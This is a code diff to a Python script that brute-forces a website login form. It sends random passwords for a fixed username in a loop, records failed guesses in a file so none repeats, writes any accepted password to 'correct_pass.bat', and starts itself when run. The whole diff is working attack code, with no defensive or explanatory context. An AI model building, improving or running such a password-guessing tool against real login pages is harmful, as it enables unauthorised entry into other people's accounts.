@@ -104,19 +104,31 @@ def send_request(username, password):
         "password": password
     }
     response = requests.post(url, data=form_data)
-    print(response.text)
+    return response
 
-send_request("1","1")
 
 def password_generator():
     while True:
-        random_pass = random.choices(chars, k=random.randint(1,17))
-        print("Random Password = "+ random_pass)
-        password = "".join(random_pass)
-        print("Password = "+password)
+        valid = False
+        while not valid:
+            random_pass = random.choices(chars, k=random.randint(1,17))
+            password = "".join(random_pass)
+            file = open("password_tries.bat","r")
+            tries = file.read()
+            file.close()
+            if password in tries: 
+                pass
+            else:
+                valid = True
         response = send_request(username, password)
 
         if 'failed to login' in response.text.lower():
+            tested_passwords = open("password_tries.bat", "a")
+            tested_passwords.write(password + "\n")
+            tested_passwords.close()
             print("Incorrect" +password)
         else: 
+            correct_password = open("correct_pass.bat","w")
+            correct_password.write(password + "\n")
             print("Correct Password"+password+"\n")
+password_generator()
